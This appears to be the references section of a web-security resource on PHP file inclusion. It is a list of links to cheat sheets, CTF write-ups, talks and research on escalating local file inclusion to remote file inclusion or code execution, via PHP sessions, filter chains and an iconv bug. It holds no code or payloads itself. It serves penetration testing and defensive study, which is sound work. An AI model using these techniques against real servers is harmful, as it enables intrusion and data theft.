* [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
* [HighOn.coffee LFI Cheat](https://highon.coffee/blog/lfi-cheat-sheet/)
* [Turning LFI to RFI](https://l.avala.mp/?p=241)
* [Is PHP vulnerable and under what conditions?](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
* [Upgrade from LFI to RCE via PHP Sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)
* [Local file inclusion tricks](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
* [CVV #1: Local File Inclusion - SI9INT](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
* [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
* [Baby^H Master PHP 2017 by @orangetw](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
* [Чтение файлов => unserialize !](https://web.archive.org/web/20200809082021/https://rdot.org/forum/showthread.php?t=4379)
* [New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
* [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
* [CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
* [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1)
* [PHP LFI with Nginx Assistance](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
* [PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18](https://gynvael.coldwind.pl/?id=376)
* [LFI2RCE via PHP Filters - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
* [Solving "includer's revenge" from hxp ctf 2021 without controlling any files - @loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
* [PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - Rémi Matasse - 18/10/2022](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
* [PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE - Rémi Matasse - 21/03/2023](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
* [One Line PHP: From Genesis to Ragnarök - Ginoah, Bookgin](https://hackmd.io/@ginoah/phpInclude#/)
* [Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix - Charles Fol - 11 December, 2023](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
* [Iconv, set the charset to RCE: exploiting the libc to hack the php engine (part 1) - Charles Fol - 27 May, 2024](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
* [OffensiveCon24- Charles Fol- Iconv, Set the Charset to RCE - 14 juin 2024](https://youtu.be/dqKFHjcK9hM)